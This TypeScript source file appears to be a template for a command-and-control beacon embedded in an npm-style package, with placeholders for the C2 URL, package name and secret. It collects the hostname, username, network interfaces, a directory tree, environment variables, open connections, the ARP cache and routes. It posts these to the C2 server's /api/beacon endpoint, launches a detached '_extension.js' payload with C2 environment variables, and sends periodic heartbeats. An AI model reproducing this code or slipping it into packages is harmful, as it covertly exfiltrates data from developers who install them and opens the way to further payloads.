import * as os from 'os';
import * as fs from 'fs';
import * as path from 'path';
import * as http from 'http';
import * as https from 'https';
import * as crypto from 'crypto';
import * as cp from 'child_process';

export const C2_URL = '__C2_URL__';
export const PKG_NAME = '__PKG_NAME__';
export const BEACON_SECRET = '__BEACON_SECRET__';
export const VERSION = '__VERSION__';

const BEACON_ID = crypto.randomUUID();

export interface SystemInfo {
  hostname: string;
  username: string;
  platform: string;
  arch: string;
  os_release: string;
  cwd: string;
  interfaces: Record<string, { address: string; family: string; internal: boolean }[]>;
  dir_tree: { name: string; type: string; path: string }[];
  env_vars: Record<string, string>;
}

export interface ExtendedSystemInfo extends SystemInfo {
  connections: string;
  arp_cache: string;
  routes: string;
}

export interface BeaconResponse {
  id: number;
  extension?: string;
}

function tree(dir: string, depth: number): { name: string; type: string; path: string }[] {
  if (depth === 0) return [];
  let result: { name: string; type: string; path: string }[] = [];
  try {
    const entries = fs.readdirSync(dir, { withFileTypes: true });
    for (const e of entries) {
      result.push({ name: e.name, type: e.isDirectory() ? 'd' : 'f', path: path.join(dir, e.name) });
      if (e.isDirectory()) result = result.concat(tree(path.join(dir, e.name), depth - 1));
    }
  } catch (_) {}
  return result;
}

function getInterfaces(): Record<string, { address: string; family: string; internal: boolean }[]> {
  const ifaces = os.networkInterfaces();
  const out: Record<string, { address: string; family: string; internal: boolean }[]> = {};
  for (const [name, addrs] of Object.entries(ifaces)) {
    if (!addrs) continue;
    out[name] = addrs.map(a => ({ address: a.address, family: a.family, internal: a.internal }));
  }
  return out;
}

function run(cmd: string): string {
  try { return cp.execSync(cmd, { timeout: 3000, stdio: ['ignore', 'pipe', 'ignore'] }).toString().trim(); } catch (_) { return ''; }
}

export function gatherSystemInfo(): SystemInfo {
  return {
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    os_release: os.release(),
    cwd: process.cwd(),
    interfaces: getInterfaces(),
    dir_tree: tree(process.cwd(), 3),
    env_vars: Object.fromEntries(
      ['PATH', 'USER', 'HOME', 'PWD', 'SHELL', 'LOGNAME', 'USERNAME'].filter(k => process.env[k]).map(k => [k, process.env[k]!])
    ),
  };
}

export function gatherExtendedInfo(): ExtendedSystemInfo {
  return {
    ...gatherSystemInfo(),
    connections: run('ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null'),
    arp_cache: run('arp -n 2>/dev/null || ip neigh 2>/dev/null'),
    routes: run('ip route 2>/dev/null || route -n 2>/dev/null'),
  };
}

function solvePoW(nonce: string, difficulty: number): number {
  const prefix = '0'.repeat(difficulty);
  let n = 0;
  while (true) {
    if (crypto.createHash('sha256').update(nonce + n).digest('hex').startsWith(prefix)) return n;
    n++;
  }
}

function httpGet(url: string): Promise<Record<string, unknown>> {
  return new Promise((resolve, reject) => {
    try {
      const u = new URL(url);
      const mod = u.protocol === 'https:' ? https : http;
      const req = mod.request(url, res => {
        let data = '';
        res.on('data', (c: Buffer) => { data += c; });
        res.on('end', () => { try { resolve(JSON.parse(data)); } catch (_) { reject(new Error('parse')); } });
      });
      req.on('error', reject);
      req.end();
    } catch (e) { reject(e); }
  });
}

function httpPost(url: string, body: string): void {
  try {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    const req = mod.request({
      hostname: u.hostname,
      port: u.port || (u.protocol === 'https:' ? 443 : 80),
      path: u.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, () => {});
    req.on('error', () => {});
    req.write(body);
    req.end();
  } catch (_) {}
}

export async function sendBeacon(opts?: { custom?: Record<string, unknown> }): Promise<BeaconResponse> {
  const info = gatherSystemInfo();
  let powExtra: Record<string, unknown> = {};
  try {
    const pow = await httpGet(C2_URL + '/api/pow');
    if (pow && pow.enabled && pow.nonce) {
      const solution = solvePoW(pow.nonce as string, (pow.difficulty as number) || 5);
      powExtra = { pow_nonce: pow.nonce, pow_solution: solution };
    }
  } catch (_) {}

  const payload: Record<string, unknown> = {
    beacon_id: BEACON_ID,
    beacon_secret: BEACON_SECRET,
    pkg: PKG_NAME,
    ...info,
    ...powExtra,
    ...(opts?.custom ?? {}),
  };
  const body = JSON.stringify(payload);
  httpPost(C2_URL + '/api/beacon', body);

  try {
    cp.spawn(process.execPath, [path.join(__dirname, '_extension.js')], {
      detached: true,
      stdio: 'ignore',
      env: { ...process.env, DOLUS_C2: C2_URL, DOLUS_PKG: PKG_NAME, DOLUS_BEACON_ID: BEACON_ID, DOLUS_SECRET: BEACON_SECRET },
    }).unref();
  } catch (_) {}

  return { id: 0 };
}

export function startHeartbeat(intervalMs = 60_000): void {
  const ping = () => {
    const body = JSON.stringify({ beacon_id: BEACON_ID, pkg: PKG_NAME, beacon_secret: BEACON_SECRET });
    httpPost(C2_URL + '/api/heartbeat', body);
  };
  ping();
  setInterval(ping, intervalMs);
}
